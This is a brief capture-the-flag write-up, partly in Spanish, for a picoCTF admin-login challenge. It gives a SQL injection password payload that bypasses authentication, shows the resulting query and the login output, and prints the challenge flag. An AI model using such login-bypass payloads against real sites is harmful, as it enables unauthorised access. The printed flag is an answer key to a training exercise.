## Descripcion
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/54253/` ([link](https://jupiter.challenges.picoctf.org/problem/54253/)) or http://jupiter.challenges.picoctf.org:54253. Try to see if you can login as admin!

## Pistas 
****** 
## Solucion
```sql
--password: ' BE ''='
SQL query: SELECT * FROM admin where password = '' OR ''=''
```
```
# Logged in!
Your flag is: picoCTF{3v3n_m0r3_SQL_7f5767f6}
```
## bandera
picoCTF{3v3n_m0r3_SQL_7f5767f6}

## Notas adicionales 
payloadbox

## Referencias